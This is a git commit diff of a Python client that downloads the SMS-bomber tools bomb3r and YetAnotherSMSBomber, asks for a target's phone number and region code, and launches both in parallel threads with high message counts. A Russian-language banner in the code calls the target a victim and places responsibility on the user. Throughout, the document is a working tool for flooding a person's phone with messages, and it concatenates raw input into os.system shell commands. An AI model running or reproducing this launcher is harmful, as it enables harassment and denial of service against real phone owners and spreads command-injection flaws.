c1f691b722a174d7a272b40a5aa414a49b30915b
SemToy <56843432+SemToy@users.noreply.github.com>
2021-12-24 23:58:46 +0300

    hotFixed: fully debugged

--- MainClient.py
+++ MainClient.py
@@ -34,20 +34,16 @@ def Download():
         print('Установлен Impulse')
         os.chdir(UP)
     if checkB3 == False:
-        subprocess.call(f'git clone https://github.com/iMro0t/bomb3r.git', Shell=True)
+        os.system(f'git clone https://github.com/iMro0t/bomb3r.git')
         os.chdir(UP + 'bomb3r')
         os.system(f'pip install -r requirements.txt')
         print('Установлен bomb3r')
         os.chdir(UP)
 
  #Функция экрана ввода номера телефона 
-def main():
-    os.chdir(UP)
-    print('ver 0.1\n')
-    #стоит создать переменные кода региона, номер без региона и полный номер(разные бомберы юзают разный формат ввода номера)
-    RC = str(input(Fore.BLACK + Back.GREEN + 'Введите код Региона без +() -->' + Back.RESET + Fore.RESET))
-    num = str(input(Fore.BLACK + Back.GREEN + 'Введите номер() -->' + Back.RESET + Fore.RESET))
-
+RC = 0
+num= 0
+    
 def logo():
     os.system(clearmode)
     print(" ________  _____ ______   ________  ________     ")
@@ -59,14 +55,13 @@ def logo():
     print("    \|__|\|__|\|__|     \|__|\|_______|\|_______|  ")
     print("re1mu's Main Bombers Client")
 
-num = 0 # номер без кода региона
-RC = 0 #Код региона для некоторых видов бомбера
-fullnum = str(num) + str(RC)
+
 
 
 logo()
 print(Fore.RED + 'Download Mode' + Fore.RESET)
 time.sleep(2)
+UP = 'def'
 name = getpass.getuser()
 #для windows установка проходит в корень D:\, с установкой на С:\ проблемы ввиде permission denied
 if sys.platform == 'win32':
@@ -75,46 +70,33 @@ elif sys.platform == 'linux':
     UP = '/home/'+ name +'/BomberClient/'
 if os.path.isdir(UP):
     logo()
-    main()
-    if num == 'exit':
-        print('выходим из клиента')
-        time.sleep(2)
-        exit()
-    if num == 'debug': #Дебаг режим, предпологается что он будет выводить вводимые пользователем данные и не очищать консоль, clear -x не удаляет прошлые сообщения
-        clearmode = 'clear -x'
-        print(Back.RED + 'Аварийный Режим' + Back.RESET)
-    
-    #проверка наличия всех бомберов и установка если такова требуется
-    if num == 'check':
-       if os.path.isdir(UP + 'Impulse'):
-           checkImpulse = True
-       else:
-        checkImpulse = False
-        if os.path.isdir(UP + 'SMS-Bomber-300-Free'):
-            check300 = True
-        else:
-            check300 = False
-        Download()
+
+    os.chdir(UP)
+    print('ver 0.1\n')
+    #стоит создать переменные кода региона, номер без региона и полный номер(разные бомберы юзают разный формат ввода номера)
+    RC = input(Fore.BLACK + Back.GREEN + 'Введите код Региона без +() -->' + Back.RESET + Fore.RESET)
+    num = input(Fore.BLACK + Back.GREEN + 'Введите номер() -->' + Back.RESET + Fore.RESET)
+    str(num)
+    str(RC)
 
 # начало использования бомберов
-    else:
-        print(Fore.BLACK + Back.YELLOW +    '                             !ВНИМАНИЕ!                          ' + Back.RESET)
-        print(Back.YELLOW + name + ', только ты несешь ответственность за эти действия. Я всего ' + Back.RESET)
-        print(Back.YELLOW + 'лишь предоставляю возможность увидеть  работу бомберов, и мою тво' + Back.RESET)
-        print(Back.YELLOW + 'рческую работу////. Все бомберы настроены на минимальный вред жер' + Back.RESET)
-        print(Back.YELLOW + 'твы. Ведь изначально этот скрипт  создавался в  качестве шутки...' + Back.RESET)
-        print(Back.YELLOW + 'Я надеюсь ты понимаешь, что сейчас делаешь.' + Back.RESET + Fore.RESET)
 
-        def YASB():
-            os.chdir(UP + 'YetAnotherSMSBomber')
-            subprocess.call(f'python bomber.py -N 1000 -C ' + RC + '-T 15 -t 10' + num, Shell=True)
-        YASBTh = Thread(target=YASB)
-        YASBTh.start()
-        def B3():
-            os.chdir(UP + 'bomb3r')
-            subprocess.call(f'python bomber.py -S -C ' + RC + '-T 15 ' + num, Shell=True)
-        B3Th = Thread(target=B3)
-        B3Th.start()
+    print(Fore.BLACK + Back.YELLOW +    '                             !ВНИМАНИЕ!                          ' + Back.RESET)
+    print(Back.YELLOW + name + ', только ты несешь ответственность за эти действия. Я всего ' + Back.RESET)
+    print(Back.YELLOW + 'лишь предоставляю возможность увидеть  работу бомберов, и мою тво' + Back.RESET)
+    print(Back.YELLOW + 'рческую работу////. Все бомберы настроены на минимальный вред жер' + Back.RESET)
+    print(Back.YELLOW + 'твы. Ведь изначально этот скрипт  создавался в  качестве шутки...' + Back.RESET)
+    print(Back.YELLOW + 'Я надеюсь ты понимаешь, что сейчас делаешь.' + Back.RESET + Fore.RESET)
+    def YASB():
+        os.chdir(UP + 'YetAnotherSMSBomber')
+        os.system('python3 bomber.py -N 1000 -C ' + RC + ' -T 15 -t 10 ' + num)
+    YASBTh = Thread(target=YASB)
+    YASBTh.start()
+    def B3():
+        os.chdir(UP + 'bomb3r')
+        os.system('python3 bomber.py --sms -C ' + RC + ' -T 15 ' + num)
+    B3Th = Thread(target=B3)
+    B3Th.start()
 
 
 
